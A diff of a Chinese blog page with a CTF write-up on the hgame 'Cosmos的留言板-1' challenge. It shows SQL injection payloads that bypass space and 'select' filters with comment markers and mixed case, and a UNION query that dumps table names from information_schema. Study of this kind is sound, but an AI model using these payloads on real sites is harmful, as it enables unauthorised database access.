@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="Cosmos的留言板-1打开环境 基本就可以知道是考SQL注入 123456输入1&amp;apos; 没有回显，可以知道使用单引号保护变量1&amp;apos;#  没有回显1# 有回显 可以用来查看一下过滤情况1&#x2F;***&#x2F;union&#x2F;***&#x2F;select#  得知select被过滤了1&#x2F;****&#x2F;union&#x2F;***&#x2F;select&#x2F;***&#x2F;table_schema&#x2F;***&#x2F;table_name&#x2F;***&#x2F;colu">
+<meta name="description" content="Cosmos的留言板-1打开环境 基本就可以知道是考SQL注入 123456输入1&amp;apos; 没有回显，可以知道使用单引号保护变量1&amp;apos;#  没有回显1# 有回显 可以用来查看一下过滤情况1&#x2F;**&#x2F;union&#x2F;**&#x2F;select#  得知select被过滤了1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;table_name&#x2F;**&#x2F;column&#x2F;**&#x2F;in">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hgame-Cosmos的留言板-1">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;27&#x2F;hgame-Cosmos%E7%9A%84%E7%95%99%E8%A8%80%E6%9D%BF-1&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="Cosmos的留言板-1打开环境 基本就可以知道是考SQL注入 123456输入1&amp;apos; 没有回显，可以知道使用单引号保护变量1&amp;apos;#  没有回显1# 有回显 可以用来查看一下过滤情况1&#x2F;***&#x2F;union&#x2F;***&#x2F;select#  得知select被过滤了1&#x2F;****&#x2F;union&#x2F;***&#x2F;select&#x2F;***&#x2F;table_schema&#x2F;***&#x2F;table_name&#x2F;***&#x2F;colu">
+<meta property="og:description" content="Cosmos的留言板-1打开环境 基本就可以知道是考SQL注入 123456输入1&amp;apos; 没有回显，可以知道使用单引号保护变量1&amp;apos;#  没有回显1# 有回显 可以用来查看一下过滤情况1&#x2F;**&#x2F;union&#x2F;**&#x2F;select#  得知select被过滤了1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;table_schema&#x2F;**&#x2F;table_name&#x2F;**&#x2F;column&#x2F;**&#x2F;in">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-02-01T03:19:20.026Z">
+<meta property="og:updated_time" content="2020-02-04T03:01:50.222Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -375,9 +375,9 @@
 
       
         <h1 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h1><p>打开环境 基本就可以知道是考SQL注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/***/union/***/select#  得知select被过滤了</span><br><span class="line">1/****/union/***/select/***/table_schema/***/table_name/***/column/***/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">1&apos; 没有回显，可以知道使用单引号保护变量</span><br><span class="line">1&apos;#  没有回显</span><br><span class="line">1# 有回显 可以用来查看一下过滤情况</span><br><span class="line">1/**/union/**/select#  得知select被过滤了</span><br><span class="line">1/**/union/**/select/**/table_schema/**/table_name/**/column/**/information_schema#  得知常规的SQL注入都没有被过滤</span><br></pre></td></tr></table></figure>
 <p>最后得知过滤掉了select和空格</p>
-<p>这里有很多个方法 用/****/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
+<p>这里有很多个方法 用/**/块注释代替空格<br>select的话可以用sel&lt;&gt;ect进行截断<br>或者大小写混写 SelecT</p>
 <p>再构造payload:</p>
 <pre><code>-1&apos;/**/or/**/&apos;1&apos;=&apos;1  回显正常</code></pre><p>爆表：</p>
 <pre><code>-1&apos;/**/union/**/SelecT/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/having&apos;1&apos;=&apos;1
@@ -508,7 +508,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
